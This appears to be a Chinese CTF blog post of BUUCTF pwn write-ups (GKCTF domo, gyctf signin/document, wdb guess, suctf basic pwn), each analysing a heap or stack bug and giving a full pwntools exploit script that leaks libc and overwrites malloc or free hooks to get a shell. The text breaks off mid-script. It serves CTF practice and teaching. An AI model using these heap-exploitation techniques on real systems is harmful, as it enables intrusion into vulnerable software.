    <url>/2020/09/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题记录"><a href="#BUUCTF刷题记录" class="headerlink" title="BUUCTF刷题记录"></a>BUUCTF刷题记录</h1><h2 id="GKCTF-2020-demo"><a href="#GKCTF-2020-demo" class="headerlink" title="GKCTF 2020 demo"></a>GKCTF 2020 demo</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>开启了沙箱，不过在main函数的最后，在while循环里做动作就不会触发到。<br>其中add和free 函数，上来都会检测<code>free_hook malloc_hook</code> 是否不为0，不为0就不让进行相应的操作。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (nbytes &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0L</span>L &amp;&amp; nbytes &lt;= <span class="hljs-number">0x120</span> )       &#123;         heaplist[SHIDWORD(nbytes)] = <span class="hljs-built_in">malloc</span>(nbytes);         <span class="hljs-built_in">puts</span>(<span class="hljs-string">"content:"</span>);         read(<span class="hljs-number">0</span>, heaplist[SHIDWORD(nbytes)], nbytes);         *(heaplist[SHIDWORD(nbytes)] + nbytes) = <span class="hljs-number">0</span>;<span class="hljs-comment">// off by null</span>         ++counts;       &#125;</code></pre></div><p>Add中存在<code>OFF BY NULL</code>。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用off by null 构造一个堆重叠</li><li>泄漏出libc地址</li><li>2次释放重叠的chunk，进行fastbin attack <code>malloc_hook_</code>为 one gadget</li><li>通过读入choice的scanf函数，传送大量字节，其会调用malloc申请chunk，即可get shell</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./domo'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27019</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-string">''' line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0009 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009 0007: 0x15 0x01 0x00 0xffffd8b6  if (A == 0xffffd8b6) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'1'</span>) add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'1'</span>) free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)data = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x100</span>)add(<span class="hljs-number">0x68</span>,data)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">4</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b31</span>info_addr(<span class="hljs-string">'libc_base '</span>,libc_base)malloc_hook=libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]realloc_hook=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>]add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))onegadget = <span class="hljs-number">0x4526a</span> + libc_basedata = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xb</span>+p64(onegadget)+ p64(realloc_hook+realloc[<span class="hljs-number">0</span>])add(<span class="hljs-number">0x68</span>,data)sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">500</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ul><li>还可以攻击<code>calloc_hook</code>,因为seccomp里面调用了calloc。</li><li>攻击io file 进行泄漏和orw。（先等待复现）<br><a href="https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py" target="_blank" rel="noopener">https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py</a></li></ul><h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a><code>gyctf_2020_signin</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul><li>uaf，但是存在一个flag位用于检测是否free过</li><li>edit只能一次</li><li>存在后门函数，其中还会用calloc申请一个chunk,并且只需要<code>0x004040C0</code>处有数值即可触发。</li></ul><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="calloc-的特性："><a href="#calloc-的特性：" class="headerlink" title="calloc 的特性："></a>calloc 的特性：</h4><ul><li>在申请到的chunk上会进行一个置零的操作</li><li>不会从tcache bin 中取chunk <h4 id="tcache-的-int-malloc有以下特性："><a href="#tcache-的-int-malloc有以下特性：" class="headerlink" title="tcache 的_int_malloc有以下特性："></a>tcache 的<code>_int_malloc</code>有以下特性：</h4></li></ul><p>在分配 fastbin 中的 chunk 时，若此chain上还有其他chunk ，则调用<code>tcache_put</code>把它们全部放入 tcache 中(smallbins中也是如此)。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;  mchunkptr tc_victim;  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count     &amp;&amp; (pp = *fb) != <span class="hljs-literal">NULL</span>)    &#123;      REMOVE_FB (fb, tc_victim, pp);      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)    &#123;      tcache_put (tc_victim, tc_idx);&#125;    &#125;&#125;</code></pre></div><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>申请8个堆， 释放8个堆，最后一个会进入fastbin</li><li>edit idx=8 的chunk，改其fd为<code>0x004040C0 - 0x10</code></li><li>申请一个chunk，此时会在tcache chain中拿走一个，留出一个空位</li><li>调用后门函数，其中calloc会从fastbin中拿出idx=8的chunk，但是由于其特性，会把剩下的fd上地址也当作一个chunk丢进tcache</li><li>丢进时是丢在tcache的头部，所以会跟tcache 进行一个link。也就是会在这个fd地址上写下，tcache chain 上其紧挨着的chunk地址。这就造成一个任意地址写。</li></ul><p>漏洞产生原因也是，libc源码中<code>tcache_put</code>基本没有安全检查。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./gyctf_2020_signin'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27592</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    s(str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    free(i)edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x4040C0</span><span class="hljs-number">-0x10</span>))add(<span class="hljs-number">8</span>)sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'6'</span>)debug()itr()</code></pre></div><h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p>在做的时候，开始有个想法，malloc申请堆时，会在其返回地址的上方留下size信息，以此来利用。但是在验证后，发现是不会的。</p><h2 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a><code>gyctf_2020_document</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><ul><li>存在uaf漏洞</li><li>只能申请一个0x20、0x90的堆块，不能进行fastbin进行攻击。</li></ul><h4 id="person数据结构"><a href="#person数据结构" class="headerlink" title="person数据结构"></a>person数据结构</h4><div class="hljs"><pre><code class="hljs undefined">                                                                                                   <span class="angelscript">┌──────────────────────┬────┐              │                      │<span class="hljs-number">0x21</span>│              ├─────────────┬────────┴────┤              │             │             │              │   main_heap │    flag     │              ├─────────────┴─────────────┤              │                       <span class="hljs-number">0x91</span>│              │─────────────┬─────────────┤              │             │             ├──────▶<span class="hljs-number">0x10</span>   │     name    │      sex    │              ├─────────────▼─────────────┤              │                           │              │                           │              │                           │              │                           │              │                           │              │          data             │              │                           │       ┌────┐ │                           ├──────▶│<span class="hljs-number">0x80</span>│ │                           │       └────┘ │                           │              │                           │              │                           │              │                           │              └───────────────────────────┘</span></code></pre></div><h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>释放一个0x90的堆，利用uaf进行泄漏libc</li><li>申请2个堆，此时在这个0x90的unsortbin会留下2个0x20的person数据结构的头</li><li>edit这个释放的堆，控制其中<code>main_heap</code>的地址，然后进行任意地址写。</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./gyctf_2020_document'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25009</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name,sex,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'sex'</span>,str(sex))    sa(<span class="hljs-string">'infor'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,sex,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'sex'</span>,str(sex))    sa(<span class="hljs-string">'infor'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x78</span>add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basedata = <span class="hljs-string">'\x00'</span>* <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x71</span>) + p64(free_hook<span class="hljs-number">-0x10</span>) + <span class="hljs-string">'\x01'</span> * <span class="hljs-number">0x58</span>edit(<span class="hljs-number">0</span>,<span class="hljs-string">"N"</span>,data)data = p64(libc_base + <span class="hljs-number">0x4526a</span>) + <span class="hljs-number">0x68</span> * <span class="hljs-string">'\x00'</span>edit(<span class="hljs-number">3</span>,<span class="hljs-string">'N'</span>,data)free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="wdb-2018-guess"><a href="#wdb-2018-guess" class="headerlink" title="wdb_2018_guess"></a><code>wdb_2018_guess</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>主要就是利用stack smashing。</p><h4 id="stack-smashing"><a href="#stack-smashing" class="headerlink" title="stack smashing"></a>stack smashing</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code>函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)&#123;  __fortify_fail (<span class="hljs-string">"stack smashing detected"</span>);&#125;<span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)&#123;  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">"*** %s ***: %s terminated\n"</span>,                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">"&lt;unknown&gt;"</span>);&#125;</code></pre></div><p>所以说如果我们利用栈溢出覆盖 <code>argv[0]</code> 为我们想要输出的字符串的地址，那么在 <strong><code>fortify_fail</code> 函数中就会输出我们想要的信息。</strong></p><p>注意其是%s来打印东西的，所以在利用时要用<code>argv[0]</code>做个跳板。</p><h5 id="如何获取栈值"><a href="#如何获取栈值" class="headerlink" title="如何获取栈值"></a>如何获取栈值</h5><p><a href="https://blog.csdn.net/chennbnbnb/article/details/104035261" target="_blank" rel="noopener">https://blog.csdn.net/chennbnbnb/article/details/104035261</a></p><p>Libc上的<code>_environ</code>存放着当前进程的环境变量，其是一个栈地址。</p><p>以此来获取栈值，然后根据偏移来访问栈中的数据。</p><h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>获取libc基地址</li><li>获取stack地址，根据偏移找到存放flag的stack address</li><li>覆盖<code>argv[0]</code>为flag的stack address</li></ul><p>其中每次都是用gets 覆盖到覆盖<code>argv[0]</code>  ,stack smashing来完成。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./GUESS'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26813</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])sla(<span class="hljs-string">'flag'</span>,data)ru(<span class="hljs-string">'hing detected ***: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20740</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(libc.sym[<span class="hljs-string">'_environ'</span>] + libc_base)sla(<span class="hljs-string">'flag'</span>,data)ru(<span class="hljs-string">'hing detected ***: '</span>)stack_flag = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x168</span>info_addr(<span class="hljs-string">'stack_base'</span>,stack_flag)data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(stack_flag)sla(<span class="hljs-string">'flag'</span>,data)itr()</code></pre></div><h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><code>suctf_2018_basic pwn</code></h2><p>无脑栈溢出</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./SUCTF_2018_basic_pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25741</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()data = <span 